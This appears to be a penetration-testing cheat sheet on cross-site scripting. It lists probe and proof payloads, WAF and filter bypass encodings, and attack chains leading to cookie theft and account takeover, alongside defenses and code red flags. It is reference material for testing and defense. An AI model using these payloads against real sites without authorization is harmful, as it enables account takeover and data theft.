# Cross-Site Scripting (XSS)

## Quick Reference

| Type | Input location | Persistence | Trigger |
|---|---|---|---|
| Reflected | URL param / header | None | Victim clicks link |
| Stored | DB / file | Permanent | Any page load |
| DOM-based | Client JS | None | Browser-side only |
| Blind | Log / admin panel | Permanent | Admin views page |
| AJAX/JSONP | API response | None | JS eval of response |

---

## Detection — Sanity Payloads (non-destructive)

```
{{7*7}}           ← also catches SSTI
<x>               ← tag injection probe
"><x>             ← attribute escape probe
';alert(1)//      ← JS context probe
\';alert(1)//     ← escaped JS context
```

Confirm execution with:
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<script>alert(1)</script>
```

---

## Bypass Techniques

### Case / encoding
```html
<IMG SRC=x OnErRoR=alert(1)>         ← mixed case
<a ONMOUSEOVER="alert(1)">           ← uppercase handler
%3cscript%3ealert(1)%3c/script%3e   ← URL encoded
%253cscript%253e                     ← double URL encoded
\x3cscript\x3e                       ← hex escape
\u003cscript\u003e                   ← unicode escape
+ADw-script+AD4-                     ← UTF-7
%c0%be%c0%bc                         ← overlong UTF-8
```

### Blacklist bypass
```html
<p <script>alert(1)</script>hello    ← malformed HTML
<a href="javascript:alert(1)">       ← protocol handler
<details open ontoggle=alert(1)>     ← uncommon event
<input autofocus onfocus=alert(1)>   ← autofocus trigger
expression(alert(1))                 ← CSS expression (IE)
```

### Quote escape bypass (attribute context)
```html
" onmouseover="alert(1)             ← break out of double quotes
' onmouseover='alert(1)             ← break out of single quotes
`onmouseover=alert(1)               ← backtick (some browsers)
```

### WAF bypass
```html
<scr<script>ipt>alert(1)</scr</script>ipt>   ← nested tags
<img/src=x onerror=alert(1)>                 ← slash instead of space
<svg/onload=alert(1)>
data:text/html,<script>alert(1)</script>     ← data URI
```

---

## Attack Chains

### Self-XSS → Account Takeover
1. Find self-XSS in profile field
2. Craft CSRF that sets victim's field to payload
3. Payload exfiltrates session cookie / CSRF token

### File Upload XSS
1. Upload `.html` or `.svg` file with `<script>`
2. File served on target domain → full XSS
3. MIME-type bypass: rename `.html` → `.png`, check if server re-detects

### AJAX / JSONP XSS
```javascript
// Vulnerable: eval() on API response
eval(response);                          // never do this
// Attack: inject into response
{"data": "x</script><script>alert(1)"}

// JSONP attack
callback=alert(1)                        // if callback param reflected unsanitized
```

### Stored XSS via HTML attribute
```html
<!-- Vulnerable template: <p style="color: {COLOR}"> -->
<!-- Payload in color field: -->
red"><script>alert(1)</script>
red" onmouseover="alert(1)
```

---

## AJAX-Based XSS (Google Gruyere pattern)

Root cause: `eval()` used instead of `JSON.parse()` to process API responses.

```javascript
// Vulnerable
eval(xhr.responseText);

// Fixed
JSON.parse(xhr.responseText);
```

Response headers also matter:
```
Content-Type: application/javascript; charset=utf-8   ← forces JS parse
```
Escape `<` and `>` as `\x3c` and `\x3e` in JSON strings.

---

## Defenses (to identify missing ones)

| Defense | Bypass if missing |
|---|---|
| Output encoding (HTML context) | `<script>`, event handlers |
| Output encoding (attribute context) | `" onmouseover=` |
| Output encoding (JS context) | `</script><script>` |
| CSP header | Inline scripts, `unsafe-inline` |
| HttpOnly cookie | Cookie theft via XSS |
| SameSite cookie | CSRF-assisted XSS chains |

**Red flags in code:**
```python
cgi.escape(var)          # doesn't escape quotes → attr XSS
var | safe               # Django/Jinja2 explicit trust → stored XSS
innerHTML = userInput    # DOM XSS
document.write(...)      # DOM XSS
eval(apiResponse)        # AJAX XSS
```

---

## Impact Escalation

- Session cookie theft → Account takeover
- CSRF token exfil → CSRF bypass
- Keylogging → credential harvest
- DOM manipulation → phishing on legit domain
- Admin panel XSS → privilege escalation / RCE (if admin can exec code)

---

## Writeup References

- XSS on Google via Apigee: https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4
- XSS via Angular Template Injection on Microsoft: https://medium.com/@impratikdabhi/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8
- Polymorphic images for XSS: https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html
- Netflix Party XSS: https://medium.com/@kristian.balog/netflix-party-simple-xss-ec92ed1d7e18
- Stored XSS Google Nest: https://medium.com/bugbountywriteup/stored-xss-in-google-nest-a82373bbda68
- Self-XSS to account takeover: https://medium.com/@ch3ckm4te/self-xss-to-account-takeover-72c789775cf8f
- WAF bypass: https://medium.com/bugbountywriteup/xss-waf-character-limitation-bypass-like-a-boss-2c788647c229
- Blind XSS: https://medium.com/@dirtycoder0124/blind-xss-a-mind-game-to-win-the-battle-4fc67c524678
- DOM XSS: https://jinone.github.io/bugbounty-a-dom-xss/
- XSS via HTTP Smuggling: https://hazana.xyz/posts/escalating-reflected-xss-with-http-smuggling/
